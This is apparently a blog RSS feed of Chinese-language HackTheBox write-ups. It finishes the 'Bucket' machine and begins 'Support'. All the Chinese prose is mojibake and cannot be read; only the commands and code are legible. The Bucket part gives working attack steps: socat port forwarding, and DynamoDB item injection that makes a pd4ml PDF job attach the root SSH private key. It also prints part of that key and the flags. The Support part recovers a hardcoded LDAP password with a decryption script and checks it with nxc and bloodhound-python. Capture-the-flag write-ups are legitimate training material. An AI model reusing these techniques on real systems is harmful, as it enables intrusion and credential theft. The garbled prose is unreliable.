æˆåŠŸå¾—åˆ° `Roy`çš„`shell`

```bash
âœ  Bucket ssh roy@10.10.10.212   
roy@10.10.10.212's password: 
Welcome to Ubuntu 20.04 LTS (GNU/Linux 5.4.0-48-generic x86_64)

 * Documentation:  https://help.ubuntu.com
 * Management:     https://landscape.canonical.com
 * Support:        https://ubuntu.com/advantage

  System information as of Fri 06 Jun 2025 07:52:46 AM UTC

  System load:                      0.05
  Usage of /:                       33.9% of 17.59GB
  Memory usage:                     30%
  Swap usage:                       0%
  Processes:                        256
  Users logged in:                  2
  IPv4 address for br-bee97070fb20: 172.18.0.1
  IPv4 address for docker0:         172.17.0.1
  IPv4 address for ens160:          10.10.10.212
  IPv6 address for ens160:          dead:beef::250:56ff:feb9:cb55

229 updates can be installed immediately.
103 of these updates are security updates.
To see these additional updates run: apt list --upgradable

The list of available updates is more than a week old.
To check for new updates run: sudo apt update
Failed to connect to https://changelogs.ubuntu.com/meta-release-lts. Check your Internet connection or proxy settings

Last login: Fri Jun  6 06:08:21 2025 from 10.10.16.27
roy@bucket:~$ 
```

å½“å‰ç›®å½•ä¸‹èƒ½å¾—åˆ° `user.txt`

```bash
roy@bucket:~$ cat user.txt
6e375b41aac41437da7b58d400a30c74
```

### ä¿¡æ¯æ”¶é›†

`db.php`

```bash
roy@bucket:~/project$ cat db.php
<?php
require 'vendor/autoload.php';
date_default_timezone_set('America/New_York');
use Aws\DynamoDb\DynamoDbClient;
use Aws\DynamoDb\Exception\DynamoDbException;

$client = new Aws\Sdk([
    'profile' => 'default',
    'region'  => 'us-east-1',
    'version' => 'latest',
    'endpoint' => 'http://localhost:4566'
]);

$dynamodb = $client->createDynamoDb();

//todo
```

å†…éƒ¨å¼€æ”¾äº†å¥½å‡ ä¸ªç«¯å£

```bash
roy@bucket:~$ ss -tulpn
Netid                  State                   Recv-Q                  Send-Q                                   Local Address:Port                                      Peer Address:Port                  Process
udp                    UNCONN                  0                       0                                        127.0.0.53%lo:53                                             0.0.0.0:*
tcp                    LISTEN                  0                       4096                                         127.0.0.1:42189                                          0.0.0.0:*
tcp                    LISTEN                  0                       4096                                     127.0.0.53%lo:53                                             0.0.0.0:*
tcp                    LISTEN                  0                       4096                                         127.0.0.1:4566                                           0.0.0.0:*
tcp                    LISTEN                  0                       128                                            0.0.0.0:22                                             0.0.0.0:*
tcp                    LISTEN                  0                       511                                          127.0.0.1:8000                                           0.0.0.0:*
tcp                    LISTEN                  0                       511                                                  *:80                                                   *:*
tcp                    LISTEN                  0                       128                                               [::]:22                                                [::]:*
```

æˆ‘ä»¬å°† `4566`å’Œ `8000`ç«¯å£è½¬å‘å‡ºå»

```bash
roy@bucket:~$ ./socat TCP-LISTEN:4567,fork tcp4:127.0.0.1:4566 &
[1] 145731
roy@bucket:~$ ./socat TCP-LISTEN:8001,fork tcp4:127.0.0.1:8000 &
[2] 145736
```

å…¶ä¸­ `8000`ç«¯å£æ˜¯è²Œä¼¼æœªå®Œå·¥çš„

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image12.png)

`4566`åƒæ˜¯`s3`çš„ç«¯ç‚¹

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image13.png)

å°è¯•é€šè¿‡`aws`è®¿é—®

```bash
âœ  Bucket aws --endpoint-url http://bucket.htb:4567 s3 ls
2025-06-06 16:04:01 adserver
```

å¯èƒ½æ˜¯ä¸€ä¸ªå†…éƒ¨ç«¯ç‚¹ï¼Œå°è¯•è¯»å–æ•°æ®åº“

```bash
âœ  Bucket aws dynamodb list-tables --endpoint-url http://bucket.htb:4567
{
    "TableNames": [
        "Music",
        "users"
    ]
}
```

`users`å’Œæˆ‘ä»¬åœ¨å¤–éƒ¨ç«¯ç‚¹è®¿é—®çš„ä¸€æ ·ï¼Œ`Music`æ˜¯ç©ºçš„ï¼ˆå¯èƒ½å…¶ä»–äººä½¿ç”¨å®˜æ–¹æ–‡æ¡£ä¸­çš„è¯­å¥åˆ›å»ºçš„ï¼‰ï¼Œæ„Ÿè§‰å°±æ˜¯ä¹‹å‰çš„å¤–éƒ¨ç«¯ç‚¹

### To root

å›åˆ°`8000`ç«¯å£ï¼Œæˆ‘ä»¬å‘ç°è¿™æ˜¯ä¸€ä¸ªä¸å°çš„é¡¹ç›®ï¼Œçº¿è·¯ä¹Ÿå¯èƒ½åœ¨è¿™é‡Œ

```bash
roy@bucket:/var/www/bucket-app$ ls
composer.json  composer.lock  files  index.php  pd4ml_demo.jar  vendor
```

```bash
roy@bucket:/var/www$ getfacl bucket-app/
# file: bucket-app/
# owner: root
# group: root
user::rwx
user:roy:r-x
group::r-x
mask::r-x
other::---
```

`index.php`

```bash
roy@bucket:/var/www/bucket-app$ cat index.php
<?php
require 'vendor/autoload.php';
use Aws\DynamoDb\DynamoDbClient;
if($_SERVER["REQUEST_METHOD"]==="POST") {
        if($_POST["action"]==="get_alerts") {
                date_default_timezone_set('America/New_York');
                $client = new DynamoDbClient([
                        'profile' => 'default',
                        'region'  => 'us-east-1',
                        'version' => 'latest',
                        'endpoint' => 'http://localhost:4566'
                ]);

                $iterator = $client->getIterator('Scan', array(
                        'TableName' => 'alerts',
                        'FilterExpression' => "title = :title",
                        'ExpressionAttributeValues' => array(":title"=>array("S"=>"Ransomware")),
                ));

                foreach ($iterator as $item) {
                        $name=rand(1,10000).'.html';
                        file_put_contents('files/'.$name,$item["data"]);
                }
                passthru("java -Xmx512m -Djava.awt.headless=true -cp pd4ml_demo.jar Pd4Cmd file:///var/www/bucket-app/files/$name 800 A4 -out files/result.pdf");
        }
}
else
{
?>
```

é€»è¾‘å¤§æ¦‚æ˜¯é€šè¿‡`POST`æ–¹æ³•è®¿é—®ï¼Œå¹¶ä¸”å‚æ•°`action`ç­‰äº`get_alerts` æ—¶ï¼Œå¯¹æ•°æ®è¿›è¡Œè¿æ¥ï¼Œç„¶åå¾ªç¯`alerts`è¡¨å¹¶ç­›é€‰è¡¨è¾¾å¼ä¸­Â `:title`Â å ä½ç¬¦çš„å€¼ï¼Œè¿™é‡Œä¸º "`Ransomware`"ã€‚å†ä¸‹é¢çš„å¾ªç¯ä¸Šè¾¹ç­›é€‰åçš„å€¼ï¼Œç”Ÿæˆä¸€ä¸ª1åˆ°10000ä¹‹é—´çš„éšæœºæ•°ï¼Œå¹¶é™„åŠ Â `.html`Â åç¼€ï¼Œä½œä¸º HTML æ–‡ä»¶åï¼Œå¹¶å°†ç­›é€‰åçš„å€¼çš„`data`å†™å…¥`HTML` æ–‡ä»¶ã€‚æš—ç¤ºäº†ä½ çš„ DynamoDBÂ `alerts`Â è¡¨ä¸­çš„é¡¹ç›®çš„Â `data`Â å±æ€§å­˜å‚¨çš„æ˜¯ HTML å†…å®¹ã€‚

æœ€åä¸€è¡Œï¼Œè°ƒç”¨äº†`pd4ml_demo.jar` ï¼Œæä¾›ç”¨äº HTML åˆ° PDF è½¬æ¢çš„åŸºæœ¬ Java APIï¼ŒåŒ…æ‹¬ PD4ML JSP æ ‡ç­¾åº“ã€‚

é‚£ä¹ˆæœ€åä¸€å¥å°±æ˜¯å°†ç”Ÿæˆ`HTML`æ–‡ä»¶é’»æ¢æˆ`PDF`æ–‡ä»¶ï¼Œå¹¶å­˜æ”¾åœ¨`files/result.pdf`

![image.png](/post-images/HackTheBoxMachine%20-%20Bucket/image14.png)

æˆ‘ä»¬è§‚å¯Ÿ`files`æ–‡ä»¶å¤¹æ²¡æœ‰ä»»ä½•æ–‡ä»¶äº§ç”Ÿï¼Œåº”è¯¥æ˜¯è¡¨`alerts`ä¸å­˜åœ¨ï¼Œæˆ‘ä»¬é¦–å…ˆåˆ›å»º`alerts`è¡¨

```bash
aws dynamodb create-table \
    --table-name alerts \
    --attribute-definitions \
        AttributeName=title,AttributeType=S \
        AttributeName=data,AttributeType=S \
    --key-schema \
        AttributeName=title,KeyType=HASH \
        AttributeName=data,KeyType=RANGE \
    --provisioned-throughput \
        ReadCapacityUnits=5,WriteCapacityUnits=5 \
    --endpoint-url http://bucket.htb:4567
```

```bash
aws dynamodb tables-list --endpoint-url http://bucket.htb:4567
{
    "TableNames": [
        "Music",
        "alerts",
        "users"
    ]
}
```

ä½†æ˜¯æˆ‘ä»¬èƒ½å‘ç°ä¸€ä¼šåï¼Œ`alerts`è¡¨å°±ä¼šè¢«åˆ é™¤ï¼Œæ‰€ä»¥æˆ‘ä»¬è¦é€šè¿‡è„šæœ¬æ¥æ‰§è¡Œæ“ä½œ

å°è¯•åŒ…å«æ–‡ä»¶ï¼Œè¿™é‡Œæˆ‘ä»¬æŸ¥çœ‹`pd4ml`çš„æ–‡æ¡£ï¼Œå…¶ä¸­æœ‰ä¸€é¡¹æ˜¯æ·»åŠ é™„ä»¶ï¼šhttps://pd4ml.com/support-topics/usage-examples/#add-attachment

```bash
<html><pd4ml:attachment style=\"align: right\" type=\"paperclip\" src=\"/root/root.txt\"/></html>
```

ç¼–å†™è„šæœ¬

```bash
echo 'create table alerts\n'
aws dynamodb create-table \
    --table-name alerts \
    --attribute-definitions \
        AttributeName=title,AttributeType=S \
        AttributeName=data,AttributeType=S \
    --key-schema \
        AttributeName=title,KeyType=HASH \
        AttributeName=data,KeyType=RANGE \
    --provisioned-throughput \
        ReadCapacityUnits=5,WriteCapacityUnits=5 \
    --endpoint-url http://bucket.htb:4567

sleep 2;
echo 'create talbe success?\n'
aws dynamodb list-tables --endpoint-url http://bucket.htb:4567
sleep 2;
echo 'Insert data:\n'
aws dynamodb put-item \
    --table-name alerts  \
    --item \
        '{"title": {"S": "Ransomware"}, "data": {"S": "<pd4ml:attachment description=\"attached.txt\" icon=\"PushPin\">file:///root/.ssh/id_rsa</pd4ml:attachment>"}}' \
    --endpoint-url http://bucket.htb:4567
echo 'POST endpoint && copy the file'
curl http://bucket.htb:8001 -X POST -d 'action=get_alerts'
```

æŸ¥çœ‹ `result.pdf` ï¼Œèƒ½æ‹¿åˆ°ç§é’¥

```bash
-----BEGIN OPENSSH PRIVATE KEY-----
b3BlbnNzaC1rZXktdjEAAAAABG5vbmUAAAAEbm9uZQAAAAAAAAABAAABlwAAAAdzc2gtcn
NhAAAAAwEAAQAAAYEAx6VphKMyxurjldmb6dy1OSn0D9dumFAUCeSoICwhhsq+fadx21SU
......
pHoTvd81++IRB1+g6GGy0gq/j0Tp+g3e0KLtvr7ZfAtutO8bcDrLjHu6Wqyl1KoleFsv6/
lt0oT70NTv2gFGWAb6WHLEByEsnYQwk5ynbIblaApQSZEyVEPkf9LmO7AEb08lvAOS0dQ1
xMyLerif0cNjmemwAAAAtyb290QHVidW50dQECAwQFBg==
-----END OPENSSH PRIVATE KEY-----
```

é€šè¿‡ç§é’¥ç™»å½•åï¼Œè¯»å– `root.txt`

```bash
root@bucket:~# cat root.txt 
880bb2407bd062f1f9896875e8d049bf
```

## æ€»ç»“

åˆä¸€æ¬¡æ„Ÿåˆ°è‡ªå·±æ˜¯çœŸçš„æ— è€å¿ƒâ€¦ä¸€çƒ¦èºèµ·æ¥å°±æ— æ³•æ€è€ƒã€‚ã€‚è¿™æ¬¡ç¢°åˆ°æ–°ä¸œè¥¿ï¼Œå¡äº†è¿˜æ˜¯è›®ä¹…çš„ï¼Œä¸è¿‡åˆ©ç”¨éƒ½æ²¡ä»€ä¹ˆæŒ¡ä½çš„åœ°æ–¹ï¼Œé™¤äº†æœ€åçš„è¯»å–æ–‡ä»¶ã€‚

å­¦ä¹ åˆ°äº† `AWS S3`ï¼Œä»¥åŠä¸€äº›`Dynamodb` çš„çŸ¥è¯†]]></content:encoded>
            <category>é¶æœº</category>
            <category>HackTheBox</category>
            <category>Linux</category>
            <category>AWS_S3</category>
            <category>Dynamodb</category>
            <category>PD4ML</category>
        </item>
        <item>
            <title><![CDATA[HackTheBox - Machine - Support]]></title>
            <link>https://www.sunsetaction.top/2025/06/05/HackTheBoxMachine -Support</link>
            <guid isPermaLink="false">https://www.sunsetaction.top/2025/06/05/HackTheBoxMachine -Support</guid>
            <pubDate>Thu, 05 Jun 2025 00:00:00 GMT</pubDate>
            <description><![CDATA[Machine Support https://app.hackthebox.com/machines/Support | Windows | Easy Medium Recon ç«¯å£ä¿¡æ¯ ä½¿ç”¨ nmap è¿›è¡Œæ‰«æ SMB æšä¸¾ æµ‹è¯•SMBæ˜¯å¦å…è®¸åŒ¿åç™»å½• å…è®¸åŒ¿åç™»å½•ï¼Œå¹¶ä¸”åœ¨support too...]]></description>
            <content:encoded><![CDATA[
# Machine -Support

> https://app.hackthebox.com/machines/Support | `Windows`Â |Â `~~Easy~~` `Medium`
> 

![image.png](/post-images/HackTheBoxMachine%20-Support/image.png)

## Recon

### ç«¯å£ä¿¡æ¯

ä½¿ç”¨ `nmap` è¿›è¡Œæ‰«æ

```bash
âœ  Support nmap -sT -min-rate 5000 10.10.11.174
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 21:06 CST
Nmap scan report for support.htb (10.10.11.174)
Host is up (0.13s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE
53/tcp   open  domain
88/tcp   open  kerberos-sec
135/tcp  open  msrpc
139/tcp  open  netbios-ssn
389/tcp  open  ldap
445/tcp  open  microsoft-ds
464/tcp  open  kpasswd5
593/tcp  open  http-rpc-epmap
636/tcp  open  ldapssl
3268/tcp open  globalcatLDAP
3269/tcp open  globalcatLDAPssl
5985/tcp open  wsman

Nmap done: 1 IP address (1 host up) scanned in 1.00 seconds
```

```bash
âœ  Support nmap -sT -A -p 53,88,135,138,389,445,636,593,3268,3269 10.10.11.174
Starting Nmap 7.95 ( https://nmap.org ) at 2025-06-04 21:07 CST
Nmap scan report for support.htb (10.10.11.174)
Host is up (0.20s latency).

PORT    STATE    SERVICE       VERSION
53/tcp  open     domain        Simple DNS Plus
88/tcp  open     kerberos-sec  Microsoft Windows Kerberos (server time: 2025-06-04 12:45:55Z)
135/tcp open     msrpc         Microsoft Windows RPC
138/tcp filtered netbios-dgm
389/tcp open     ldap          Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
445/tcp open     microsoft-ds?
636/tcp open     tcpwrapped
593/tcp  open  ncacn_http Microsoft Windows RPC over HTTP 1.0
3268/tcp open  ldap       Microsoft Windows Active Directory LDAP (Domain: support.htb0., Site: Default-First-Site-Name)
3269/tcp open  tcpwrapped
Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
Device type: general purpose
Running (JUST GUESSING): Microsoft Windows 2022 (88%)
OS CPE: cpe:/o:microsoft:windows_server_2022
Aggressive OS guesses: Microsoft Windows Server 2022 (88%)
No exact OS matches for host (test conditions non-ideal).
Network Distance: 2 hops
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
| smb2-time: 
|   date: 2025-06-04T12:46:16
|_  start_date: N/A
|_clock-skew: -21m30s
| smb2-security-mode: 
|   3:1:1: 
|_    Message signing enabled and required

TRACEROUTE (using proto 1/icmp)
HOP RTT       ADDRESS
1   122.30 ms 10.10.16.1
2   237.33 ms support.htb (10.10.11.174)

OS and Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 68.41 seconds
```

### SMB æšä¸¾

æµ‹è¯•`SMB`æ˜¯å¦å…è®¸åŒ¿åç™»å½•

```bash
âœ  Support smbclient -L 10.10.11.174 -U anonymous                                      
Password for [WORKGROUP\anonymous]:

        Sharename       Type      Comment
        ---------       ----      -------
        ADMIN$          Disk      Remote Admin
        C$              Disk      Default share
        IPC$            IPC       Remote IPC
        NETLOGON        Disk      Logon server share 
        support-tools   Disk      support staff tools
        SYSVOL          Disk      Logon server share 
Reconnecting with SMB1 for workgroup listing.
do_connect: Connection to 10.10.11.174 failed (Error NT_STATUS_RESOURCE_NAME_NOT_FOUND)
Unable to connect with SMB1 -- no workgroup available
```

å…è®¸åŒ¿åç™»å½•ï¼Œå¹¶ä¸”åœ¨`support-tools`ä¸­æœ‰ä¸€äº›å·¥å…·ï¼Œå…¨éƒ¨ `get` ä¸‹æ¥

```bash
âœ  Support smbclient //10.10.11.174/support-tools -U anonymous -N
Try "help" to get a list of possible commands.
smb: \> dir
  .                                   D        0  Thu Jul 21 01:01:06 2022
  ..                                  D        0  Sat May 28 19:18:25 2022
  7-ZipPortable_21.07.paf.exe         A  2880728  Sat May 28 19:19:19 2022
  npp.8.4.1.portable.x64.zip          A  5439245  Sat May 28 19:19:55 2022
  putty.exe                           A  1273576  Sat May 28 19:20:06 2022
  SysinternalsSuite.zip               A 48102161  Sat May 28 19:19:31 2022
  UserInfo.exe.zip                    A   277499  Thu Jul 21 01:01:07 2022
  windirstat1_1_2_setup.exe           A    79171  Sat May 28 19:20:17 2022
  WiresharkPortable64_3.6.5.paf.exe      A 44398000  Sat May 28 19:19:43 2022

                4026367 blocks of size 4096. 955928 blocks available
smb: \> 
```

1. `7-ZipPortable_21.07.paf.exe`:
    - **å·¥å…·:**Â 7-Zip Portable
    - **ç”¨é€”:**Â è¿™æ˜¯ä¸€ä¸ªä¾¿æºç‰ˆæœ¬çš„ 7-Zip æ–‡ä»¶å½’æ¡£å™¨ã€‚7-Zip æ˜¯ä¸€æ¬¾å…è´¹å¼€æºçš„å‹ç¼©/è§£å‹ç¼©è½¯ä»¶ï¼Œæ”¯æŒå¤šç§æ ¼å¼ï¼Œå¦‚ 7z, ZIP, GZIP, TAR, RAR ç­‰ã€‚`.paf.exe`Â é€šå¸¸æ˜¯ PortableApps.com æ ¼å¼çš„ä¾¿æºåº”ç”¨ã€‚
2. `npp.8.4.1.portable.x64.zip`:
    - **å·¥å…·:**Â Notepad++ Portable (64ä½)
    - **ç”¨é€”:**Â è¿™æ˜¯ä¸€ä¸ªåŒ…å« Notepad++ ä¾¿æºç‰ˆçš„ ZIP å‹ç¼©æ–‡ä»¶ã€‚Notepad++ æ˜¯ä¸€æ¬¾éå¸¸æµè¡Œçš„å…è´¹æºä»£ç ç¼–è¾‘å™¨å’Œ Windows è®°äº‹æœ¬æ›¿ä»£å“ï¼Œæ”¯æŒå¤šç§ç¼–ç¨‹è¯­è¨€ï¼ŒåŠŸèƒ½å¼ºå¤§ã€‚
3. `putty.exe`:
    - **å·¥å…·:**Â PuTTY
    - **ç”¨é€”:**Â è¿™æ˜¯ä¸€ä¸ªç‹¬ç«‹çš„ PuTTY å¯æ‰§è¡Œæ–‡ä»¶ã€‚PuTTY æ˜¯ä¸€æ¬¾å¹¿å—æ¬¢è¿çš„å…è´¹å¼€æºç»ˆç«¯æ¨¡æ‹Ÿå™¨ã€ä¸²è¡Œæ§åˆ¶å°å’Œç½‘ç»œæ–‡ä»¶ä¼ è¾“åº”ç”¨ç¨‹åºã€‚å®ƒæœ€å¸¸ç”¨äºé€šè¿‡ SSHã€Telnet æˆ– rlogin åè®®è¿æ¥åˆ°è¿œç¨‹æœåŠ¡å™¨ã€‚
4. `SysinternalsSuite.zip`:
    - **å·¥å…·:**Â Sysinternals Suite
    - **ç”¨é€”:**Â è¿™æ˜¯ä¸€ä¸ªåŒ…å«å¾®è½¯ Sysinternals Suite çš„ ZIP å‹ç¼©æ–‡ä»¶ã€‚Sysinternals Suite æ˜¯ä¸€å¥—ç”± Mark Russinovich å¼€å‘çš„å¼ºå¤§çš„ Windows ç³»ç»Ÿç®¡ç†ã€æ•…éšœæ’é™¤å’Œè¯Šæ–­å·¥å…·é›†åˆï¼ˆç°åœ¨å±äºå¾®è½¯ï¼‰ã€‚è‘—åçš„å·¥å…·åŒ…æ‹¬ Process Explorer, Process Monitor, Autoruns, PsExec ç­‰ã€‚
5. `UserInfo.exe.zip`:
    - **å·¥å…·:**Â æœªçŸ¥ (å¯èƒ½ä¸ºè‡ªå®šä¹‰æˆ–ç‰¹å®šç”¨é€”å·¥å…·)
    - **ç”¨é€”:**Â è¿™æ˜¯ä¸€ä¸ªåä¸ºÂ `UserInfo.exe`Â çš„å¯æ‰§è¡Œæ–‡ä»¶çš„ ZIP å‹ç¼©åŒ…ã€‚ä»åç§°ä¸Šçœ‹ï¼Œå®ƒå¯èƒ½æ˜¯ä¸€ä¸ªç”¨äºæ”¶é›†æˆ–æ˜¾ç¤ºç”¨æˆ·ä¿¡æ¯çš„å·¥å…·ã€‚è¿™å¯èƒ½æ˜¯ç³»ç»Ÿç®¡ç†å‘˜å¸¸ç”¨çš„è‡ªå®šä¹‰è„šæœ¬æˆ–å°ç¨‹åºï¼Œæˆ–è€…æ˜¯ç‰¹å®šåœºæ™¯ä¸‹éœ€è¦çš„å·¥å…·ã€‚åœ¨æ¸—é€æµ‹è¯•ä¸­ï¼Œè¿™ç±»è‡ªå®šä¹‰å·¥å…·å¾€å¾€å€¼å¾—è¿›ä¸€æ­¥åˆ†æã€‚
6. `windirstat1_1_2_setup.exe`:
    - **å·¥å…·:**Â WinDirStat å®‰è£…ç¨‹åº
    - **ç”¨é€”:**Â è¿™æ˜¯ WinDirStat ç‰ˆæœ¬ 1.1.2 çš„å®‰è£…ç¨‹åºã€‚WinDirStat æ˜¯ä¸€æ¬¾ç£ç›˜ä½¿ç”¨æƒ…å†µç»Ÿè®¡æŸ¥çœ‹å™¨å’Œæ¸…ç†å·¥å…·ï¼Œå®ƒå¯ä»¥å›¾å½¢åŒ–åœ°æ˜¾ç¤ºç£ç›˜ç©ºé—´å ç”¨æƒ…å†µï¼Œå¸®åŠ©ç”¨æˆ·æ‰¾åˆ°å ç”¨ç©ºé—´å¤§çš„æ–‡ä»¶å’Œæ–‡ä»¶å¤¹ã€‚
7. `WiresharkPortable64_3.6.5.paf.exe`:
    - **å·¥å…·:**Â Wireshark Portable (64ä½)
    - **ç”¨é€”:**Â è¿™æ˜¯ä¸€ä¸ªä¾¿æºç‰ˆæœ¬çš„ Wiresharkã€‚Wireshark æ˜¯ä¸–ç•Œä¸Šåº”ç”¨æœ€å¹¿æ³›çš„ç½‘ç»œåè®®åˆ†æå™¨ï¼Œç”¨äºæ•è·å’Œäº¤äº’å¼æµè§ˆè®¡ç®—æœºç½‘ç»œä¸Šè¿è¡Œçš„æµé‡ã€‚`.paf.exe`Â æ ¼å¼è¡¨æ˜å®ƒä¹Ÿæ˜¯ PortableApps.com çš„ä¾¿æºåº”ç”¨ã€‚

ä¸Šé¢çš„æ‰€æœ‰åº”ç”¨ä¸­åªæœ‰`UserInfo.exe` ä¸æ˜¯å…¬å¼€çš„è½¯ä»¶ï¼Œæˆ‘ä»¬å¯ä»¥ç€é‡å¯¹è¯¥è½¯ä»¶è¿›è¡Œåˆ†æ

## åˆ†æ UserInfo.exe

ä½¿ç”¨ `dnSpy` æ¥åˆ†æï¼Œè¯¥ç¨‹åºè²Œä¼¼æ˜¯é€šè¿‡ `LDAP` æ¥æ£€ç´¢ç”¨æˆ·ä¿¡æ¯ï¼Œå¹¶ä¸”å†…ç½®äº†ç”¨æˆ·ï¼ˆå¤§è‡´çœ‹æ‡‚ï¼‰

ä¸‹é¢çš„ç±» `Protected` æ˜¯åŠ å¯†å¯†ç çš„ï¼ˆè¿™é‡Œå¼€å§‹ä½¿ç”¨`AI`æ¥åˆ†æï¼‰

è¿™ä¸€æ®µä»£ç å…¶å®æ˜¯ä½¿ç”¨å¼‚æˆ–åŠ å¯†å¯†ç ï¼Œå¹¶ä¸”ç§˜é’¥æ˜¯`armando` ï¼Œå› æ­¤æˆ‘ä»¬èƒ½å¤Ÿç›´æ¥å¾—åˆ°å¯†ç 

```bash
using System;
using System.Text;

namespace UserInfo.Services
{
	// Token: 0x02000006 RID: 6
	internal class Protected
	{
		// Token: 0x0600000F RID: 15 RVA: 0x00002118 File Offset: 0x00000318
		public static string getPassword()
		{
			byte[] array = Convert.FromBase64String(Protected.enc_password);
			byte[] array2 = array;
			for (int i = 0; i < array.Length; i++)
			{
				array2[i] = (array[i] ^ Protected.key[i % Protected.key.Length] ^ 223);
			}
			return Encoding.Default.GetString(array2);
		}

		// Token: 0x04000005 RID: 5
		private static string enc_password = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E";

		// Token: 0x04000006 RID: 6
		private static byte[] key = Encoding.ASCII.GetBytes("armando");
	}
}
```

é€šè¿‡ `AI` ç”Ÿæˆè§£å¯†è„šæœ¬

```bash
import base64

# ä» C# ä»£ç ä¸­è·å–çš„å€¼
enc_password_b64 = "0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E"
key_string = "armando"
xor_constant = 223

# 1. Base64 è§£ç 
try:
    encrypted_bytes = base64.b64decode(enc_password_b64)
except base64.binascii.Error as e:
    print(f"Base64 è§£ç é”™è¯¯: {e}")
    exit()

# 2. è·å–å¯†é’¥çš„å­—èŠ‚å½¢å¼ (ASCII)
key_bytes = key_string.encode('ascii')

# å‡†å¤‡ä¸€ä¸ªå¯å˜çš„å­—èŠ‚æ•°ç»„æ¥å­˜æ”¾è§£å¯†åçš„å­—èŠ‚
decrypted_bytes = bytearray()

# 3. æ‰§è¡Œ XOR è§£å¯†
for i in range(len(encrypted_bytes)):
    # C# ä¸­çš„é€»è¾‘æ˜¯: (byte ^ key_byte ^ 223)
    dec_byte = encrypted_bytes[i] ^ key_bytes[i % len(key_bytes)] ^ xor_constant
    decrypted_bytes.append(dec_byte)

# 4. å°†è§£å¯†åçš„å­—èŠ‚æ•°ç»„è½¬æ¢ä¸ºå­—ç¬¦ä¸²
# C# ä¸­çš„ Encoding.Default è¡Œä¸ºå¯èƒ½ä¾èµ–äºç³»ç»ŸåŒºåŸŸè®¾ç½®ã€‚
# æˆ‘ä»¬é¦–å…ˆå°è¯• 'utf-8'ï¼Œå¦‚æœå¯†ç åŒ…å«é ASCII å­—ç¬¦ä¸”ç¼–ç ä¸åŒï¼Œå¯èƒ½éœ€è¦è°ƒæ•´ã€‚
# å¯¹äºè¿™ä¸ªç‰¹å®šçš„å¯†ç  "Cisco.12345"ï¼Œ'utf-8' æˆ– 'ascii' éƒ½å¯ä»¥ã€‚
try:
    final_password = decrypted_bytes.decode('utf-8')
except UnicodeDecodeError:
    # å¦‚æœ utf-8 å¤±è´¥ï¼Œå¯ä»¥å°è¯•å…¶ä»–ç¼–ç ï¼Œå¦‚ latin-1 (å¸¸ç”¨äºæ¨¡æ‹ŸæŸäº› Windows é»˜è®¤ç¼–ç )
    try:
        final_password = decrypted_bytes.decode('latin-1')
    except UnicodeDecodeError as e:
        print(f"å­—ç¬¦ä¸²è§£ç é”™è¯¯: {e}")
        print(f"è§£å¯†åçš„å­—èŠ‚ï¼ˆåŸå§‹ï¼‰: {decrypted_bytes}")
        final_password = "è§£ç å¤±è´¥ï¼Œè¯·æ£€æŸ¥ç¼–ç "

# æ‰“å°ç»“æœ
print(f"Base64 ç¼–ç çš„å¯†æ–‡: {enc_password_b64}")
print(f"å¯†é’¥å­—ç¬¦ä¸²: {key_string}")
print(f"å›ºå®šçš„ XOR å€¼: {xor_constant}")
print(f"è§£å¯†åçš„å­—èŠ‚ (åå…­è¿›åˆ¶): {decrypted_bytes.hex()}")
print(f"è§£å¯†åçš„å¯†ç : {final_password}")
```

```bash
âœ  Support python getpass.py       
Base64 ç¼–ç çš„å¯†æ–‡: 0Nv32PTwgYjzg9/8j5TbmvPd3e7WhtWWyuPsyO76/Y+U193E
å¯†é’¥å­—ç¬¦ä¸²: armando
å›ºå®šçš„ XOR å€¼: 223
è§£å¯†åçš„å­—èŠ‚ (åå…­è¿›åˆ¶): 6e764566454b31365e31614d3424653741636c55663878247452577850574f31256c6d7a
è§£å¯†åçš„å¯†ç : nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz
```

è€Œ `LdapQuery` ç±»çš„æ„é€ å‡½æ•°ä¸­èƒ½çœ‹åˆ°

```bash
public LdapQuery()
		{
			string password = Protected.getPassword();
			this.entry = new DirectoryEntry("LDAP://support.htb", "support\\ldap", password);
			this.entry.AuthenticationType = AuthenticationTypes.Secure;
			this.ds = new DirectorySearcher(this.entry);
		}
```

åˆ›å»º `DirectoryEntry` å¯¹è±¡æ—¶ï¼Œç¬¬äºŒä¸ªå‚æ•°é€šå¸¸ç”¨äºæŒ‡å®šç”¨æˆ·åã€‚å› æ­¤ï¼Œè¿™é‡Œçš„ç”¨æˆ·åæ˜¯ï¼š`support\ldap`

è¿™ä¸ªæ ¼å¼ `DOMAIN\username` è¡¨æ˜ `support` å¯èƒ½æ˜¯åŸŸåæˆ–è€…å·¥ä½œç»„åï¼Œè€Œ `ldap` æ˜¯å…·ä½“çš„ç”¨æˆ·åã€‚

æˆ‘ä»¬ç›´æ¥æµ‹è¯•å‡­æ®æ˜¯å¦æ˜¯æ­£ç¡®çš„

```bash
âœ  Support nxc ldap 10.10.11.174 -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d support.htb
LDAP        10.10.11.174    389    DC               [*] Windows Server 2022 Build 20348 (name:DC) (domain:support.htb)
LDAP        10.10.11.174    389    DC               [+] support.htb\ldap:nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz 
```

å‡­æ®æ˜¯æ­£ç¡®çš„

## åŸŸåˆ†æ

### åŸŸåˆæ¬¡åˆ†æ

`BloodHound` åˆ†æåŸŸ

```bash
âœ  Support bloodhound-python -u ldap -p 'nvEfEK16^1aM4$e7AclUf8x$tRWxPWO1%lmz' -d 'support.htb' -ns 10.10.11.174 --zip -c All -dc 'support.htb'
INFO: BloodHound.py for BloodHound LEGACY (BloodHound 4.2 and 4.3)
INFO: Found AD domain: support.htb
INFO: Getting TGT for user
INFO: Connecting to LDAP server: support.htb
WARNING: Kerberos auth to LDAP failed, trying NTLM
INFO: Found 1 domains
INFO: Found 1 domains in the forest
INFO: Found 3 computers
INFO: Connecting to LDAP server: support.htb
